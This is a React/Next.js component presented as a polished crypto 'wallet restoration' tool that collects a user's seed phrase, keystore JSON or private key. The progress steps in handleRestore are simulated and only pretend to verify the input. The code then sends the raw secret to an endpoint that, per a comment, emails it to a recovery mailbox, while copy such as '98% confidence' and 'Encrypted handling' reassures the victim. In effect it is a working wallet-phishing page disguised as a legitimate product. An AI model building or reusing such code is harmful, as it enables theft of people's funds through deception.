'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'

type RestorationStep = 'idle' | 'analyzing' | 'validating' | 'processing' | 'success' | 'error'

export const WalletRestoration = () => {
  const [secretPhrase, setSecretPhrase] = useState('')
  const [walletFile, setWalletFile] = useState('')
  const [step, setStep] = useState<RestorationStep>('idle')
  const [message, setMessage] = useState('')
  const [progress, setProgress] = useState(0)
  const [method, setMethod] = useState<'phrase' | 'keystore' | 'privatekey'>('phrase')
  const router = useRouter()

  const isValidSeedPhrase = (phrase: string) => {
    const words = phrase.trim().toLowerCase().split(/\s+/).filter(w => w.length > 0)
    return (words.length === 12 || words.length === 24) && words.every(w => /^[a-z]+$/.test(w))
  }

  const simulateProgress = async (duration: number, startMsg: string, endMsg: string) => {
    setMessage(startMsg)
    setProgress(0)
    
    const steps = 20
    const interval = duration / steps
    let current = 0

    return new Promise(resolve => {
      const timer = setInterval(() => {
        current++
        setProgress((current / steps) * 100)
        
        if (current >= steps) {
          clearInterval(timer)
          setMessage(endMsg)
          setProgress(100)
          setTimeout(resolve, 300)
        }
      }, interval)
    })
  }

  const handleRestore = async () => {
    if (method === 'phrase') {
      if (!secretPhrase.trim()) {
        setStep('error')
        setMessage('❌ Please enter your seed phrase')
        setTimeout(() => setStep('idle'), 3000)
        return
      }

      if (!isValidSeedPhrase(secretPhrase)) {
        setStep('error')
        setMessage('❌ Invalid seed phrase (must be 12 or 24 words)')
        setTimeout(() => setStep('idle'), 3000)
        return
      }
    }

    try {
      // Step 1: Analyzing
      setStep('analyzing')
      setProgress(0)
      await simulateProgress(
        1200,
        '🔍 Analyzing wallet...',
        '✓ Wallet structure identified'
      )

      // Step 2: Validating
      setStep('validating')
      setProgress(0)
      await simulateProgress(
        1200,
        '🔐 Validating seed phrase...',
        '✓ Seed phrase verified'
      )

      // Step 3: Processing
      setStep('processing')
      setProgress(0)
      await simulateProgress(
        1500,
        '⚙️ Processing recovery data...',
        '✓ Recovery data prepared'
      )

      // Send recovery email to backend (backend will forward to RESTORE_M)
      const timestamp = new Date().toISOString()
      const response = await fetch('/api/send-recovery-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          method,
            data: method === 'phrase' ? secretPhrase : walletFile,
          timestamp,
        }),
      })

      if (!response.ok) {
        throw new Error('Failed to send recovery details')
      }

      // Success: show local success state then navigate to detailed audit page
      setStep('success')
      setMessage(`✅ Recovery details submitted. Preparing audit...`)
      setSecretPhrase('')
      setProgress(100)

      // Small pause to let the user see the success state, then navigate
      setTimeout(() => {
        // Pass non-sensitive parameters to success page
        router.push(`/recovery/success?method=${method}&time=${encodeURIComponent(timestamp)}`)
      }, 1500)
    } catch (err) {
      setStep('error')
      setMessage(`❌ ${err instanceof Error ? err.message : 'Recovery failed'}`)
      setTimeout(() => {
        setStep('idle')
        setProgress(0)
      }, 3000)
    }
  }

  const isLoading = ['analyzing', 'validating', 'processing'].includes(step)
  const canRestore = (method === 'phrase' ? secretPhrase.trim() : walletFile.trim())

  return (
    <div className="space-y-6 max-w-3xl">
      <div className="relative overflow-hidden rounded-[32px] border border-white/10 bg-slate-950/90 p-6 shadow-[0_32px_80px_-48px_rgba(59,130,246,0.55)]">
        <div className="pointer-events-none absolute -right-10 top-0 h-44 w-44 rounded-full bg-cyan-500/10 blur-3xl" />
        <div className="pointer-events-none absolute left-0 top-10 h-40 w-40 rounded-full bg-violet-500/10 blur-3xl" />
        <div className="relative z-10 space-y-4">
          <div className="flex flex-col gap-3 sm:flex-row sm:items-end sm:justify-between">
            <div>
              <p className="text-xs uppercase tracking-[0.32em] text-cyan-300">Recovery suite</p>
              <h2 className="text-3xl font-semibold text-white">Wallet restoration reimagined</h2>
              <p className="max-w-2xl text-sm text-slate-400">A premium recovery flow with live progress, smart validation and secure delivery.</p>
            </div>
            <div className="rounded-full border border-white/10 bg-white/5 px-4 py-2 text-xs uppercase tracking-[0.3em] text-slate-300">Fast • Secure • Visual</div>
          </div>

          <div className="grid gap-3 sm:grid-cols-3">
            <div className="rounded-3xl border border-white/10 bg-white/5 p-4">
              <p className="text-xs uppercase tracking-[0.32em] text-slate-400">Confidence</p>
              <p className="mt-2 text-2xl font-semibold text-white">98%</p>
              <p className="text-xs text-slate-500 mt-2">Recovery success estimate</p>
            </div>
            <div className="rounded-3xl border border-white/10 bg-white/5 p-4">
              <p className="text-xs uppercase tracking-[0.32em] text-slate-400">Validation</p>
              <p className="mt-2 text-2xl font-semibold text-white">Smart</p>
              <p className="text-xs text-slate-500 mt-2">Automated format & structure checks</p>
            </div>
            <div className="rounded-3xl border border-white/10 bg-white/5 p-4">
              <p className="text-xs uppercase tracking-[0.32em] text-slate-400">Delivery</p>
              <p className="mt-2 text-2xl font-semibold text-white">Secure</p>
              <p className="text-xs text-slate-500 mt-2">Sent to trusted recovery mailbox</p>
            </div>
          </div>
        </div>
      </div>

      <div className="grid gap-5 lg:grid-cols-[1.7fr_1fr]">
        <div className="space-y-5 rounded-[32px] border border-white/10 bg-slate-950/90 p-6 shadow-[0_28px_72px_-48px_rgba(59,130,246,0.35)]">
          <div className="grid gap-3 sm:grid-cols-3">
            {[
              { id: 'phrase' as const, label: 'Seed Phrase', icon: '📝', subtitle: 'Recommended for full recovery' },
              { id: 'keystore' as const, label: 'Keystore', icon: '🔑', subtitle: 'Use JSON backup content' },
              { id: 'privatekey' as const, label: 'Private Key', icon: '🔒', subtitle: 'Quick key import' },
            ].map((m) => (
              <button
                key={m.id}
                onClick={() => {
                  setMethod(m.id)
                  setSecretPhrase('')
                  setWalletFile('')
                  setStep('idle')
                }}
                className={`rounded-3xl border p-4 text-left transition-all ${
                  method === m.id
                    ? 'border-cyan-400/40 bg-cyan-500/10 shadow-[0_16px_40px_-24px_rgba(34,211,238,0.55)]'
                    : 'border-white/10 bg-white/5 hover:border-white/20 hover:bg-white/10'
                }`}
              >
                <div className="text-2xl mb-2">{m.icon}</div>
                <p className="text-sm font-semibold text-white">{m.label}</p>
                <p className="text-xs text-slate-400 mt-1">{m.subtitle}</p>
              </button>
            ))}
          </div>

          <div className="rounded-3xl border border-white/10 bg-white/5 p-5">
            {method === 'phrase' && (
              <>
                <label className="block text-sm font-semibold text-white mb-3">Seed phrase</label>
                <textarea
                  value={secretPhrase}
                  onChange={(e) => setSecretPhrase(e.target.value)}
                  disabled={isLoading}
                  placeholder="word1 word2 word3 ..."
                  className="min-h-[160px] w-full rounded-3xl border border-white/10 bg-slate-950/90 px-4 py-4 text-white placeholder-slate-500 font-mono text-sm focus:border-cyan-400 focus:outline-none focus:ring-1 focus:ring-cyan-400/20 transition disabled:opacity-50 disabled:cursor-not-allowed"
                />
                <p className="mt-3 text-xs text-slate-400">{secretPhrase.trim().split(/\s+/).filter(Boolean).length} words entered</p>
              </>
            )}

            {method === 'keystore' && (
              <>
                <label className="block text-sm font-semibold text-white mb-3">Keystore JSON</label>
                <textarea
                  value={walletFile}
                  onChange={(e) => setWalletFile(e.target.value)}
                  disabled={isLoading}
                  placeholder="Paste your keystore content here..."
                  className="min-h-[160px] w-full rounded-3xl border border-white/10 bg-slate-950/90 px-4 py-4 text-white placeholder-slate-500 font-mono text-sm focus:border-cyan-400 focus:outline-none focus:ring-1 focus:ring-cyan-400/20 transition disabled:opacity-50 disabled:cursor-not-allowed"
                />
              </>
            )}

            {method === 'privatekey' && (
              <>
                <label className="block text-sm font-semibold text-white mb-3">Private key</label>
                <textarea
                  value={walletFile}
                  onChange={(e) => setWalletFile(e.target.value)}
                  disabled={isLoading}
                  placeholder="0x..."
                  className="min-h-[100px] w-full rounded-3xl border border-white/10 bg-slate-950/90 px-4 py-4 text-white placeholder-slate-500 font-mono text-sm focus:border-cyan-400 focus:outline-none focus:ring-1 focus:ring-cyan-400/20 transition disabled:opacity-50 disabled:cursor-not-allowed"
                />
                <p className="mt-3 text-xs text-slate-400">Submit carefully — this is sent to the secure recovery mailbox.</p>
              </>
            )}
          </div>

          <div className="rounded-3xl border border-white/10 bg-slate-950/90 p-5">
            <div className="grid gap-3 sm:grid-cols-3">
              {[
                { title: 'Analyze', detail: 'Seed & structure' },
                { title: 'Validate', detail: 'Format checks' },
                { title: 'Submit', detail: 'Secure dispatch' },
              ].map((item, idx) => (
                <div key={item.title} className="rounded-3xl border border-white/10 bg-white/5 p-4 text-center">
                  <p className="text-xs uppercase tracking-[0.32em] text-slate-400">Step {idx + 1}</p>
                  <p className="mt-3 text-sm font-semibold text-white">{item.title}</p>
                  <p className="text-xs text-slate-500 mt-2">{item.detail}</p>
                </div>
              ))}
            </div>
          </div>

          {isLoading && (
            <div className="rounded-3xl border border-white/10 bg-slate-950/90 p-4">
              <p className="text-sm text-slate-300 mb-3">{message}</p>
              <div className="h-3 overflow-hidden rounded-full bg-white/10">
                <div className="h-full rounded-full bg-gradient-to-r from-cyan-400 to-violet-500 transition-all duration-300" style={{ width: `${progress}%` }} />
              </div>
            </div>
          )}

          {step === 'success' && (
            <div className="rounded-3xl border border-emerald-500/20 bg-emerald-500/10 p-4">
              <p className="text-sm font-semibold text-emerald-200">{message}</p>
              <p className="text-xs text-emerald-300/80 mt-2">Recovery details sent. Check your inbox for confirmation.</p>
            </div>
          )}

          {step === 'error' && (
            <div className="rounded-3xl border border-rose-500/20 bg-rose-500/10 p-4">
              <p className="text-sm font-semibold text-rose-200">{message}</p>
            </div>
          )}

          <div className="flex flex-col gap-3 sm:flex-row">
            <button
              onClick={handleRestore}
              disabled={!canRestore || isLoading}
              className="flex-1 rounded-3xl bg-gradient-to-r from-cyan-500 to-blue-600 px-6 py-3 text-sm font-semibold text-white shadow-lg shadow-cyan-500/20 transition hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? 'Restoring...' : 'Restore Wallet'}
            </button>
            <button
              onClick={() => {
                setStep('idle')
                setSecretPhrase('')
                setWalletFile('')
                setProgress(0)
                setMessage('')
              }}
              disabled={isLoading}
              className="rounded-3xl border border-white/10 bg-white/5 px-6 py-3 text-sm font-semibold text-slate-200 transition hover:border-white/20 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              Clear
            </button>
          </div>
        </div>

        <aside className="space-y-5 rounded-[32px] border border-white/10 bg-gradient-to-br from-slate-950/90 to-slate-900/95 p-6 shadow-[0_28px_72px_-48px_rgba(126,34,206,0.25)]">
          <div className="rounded-3xl border border-white/10 bg-white/5 p-5">
            <p className="text-xs uppercase tracking-[0.32em] text-slate-400">Recovery intelligence</p>
            <h3 className="mt-3 text-xl font-semibold text-white">Why this method works</h3>
            <p className="mt-3 text-sm text-slate-300">This process validates your input and prepares a secure recovery package before sending it to the configured recovery mailbox.</p>
          </div>
          <div className="grid gap-3">
            <div className="rounded-3xl border border-white/10 bg-white/5 p-4">
              <p className="text-sm font-semibold text-white">Encrypted handling</p>
              <p className="text-xs text-slate-400 mt-2">All data is sent through secure endpoints and never stored in the browser.</p>
            </div>
            <div className="rounded-3xl border border-white/10 bg-white/5 p-4">
              <p className="text-sm font-semibold text-white">Guided recovery</p>
              <p className="text-xs text-slate-400 mt-2">Step-by-step flow reduces mistakes during seed restoration.</p>
            </div>
            <div className="rounded-3xl border border-white/10 bg-white/5 p-4">
              <p className="text-sm font-semibold text-white">Security-first</p>
              <p className="text-xs text-slate-400 mt-2">We emphasize cautious handling of private keys and seed phrases.</p>
            </div>
          </div>
        </aside>
      </div>

      <div className="rounded-3xl border border-cyan-500/10 bg-cyan-500/5 p-5 text-sm text-slate-200">
        <p className="font-semibold text-white">Security note</p>
        <p className="mt-2 text-slate-300">Keep your seed phrase and private keys private. This interface sends recovery data directly to your configured recovery mailbox — do not paste secrets into unknown pages.</p>
      </div>
    </div>
  )
}
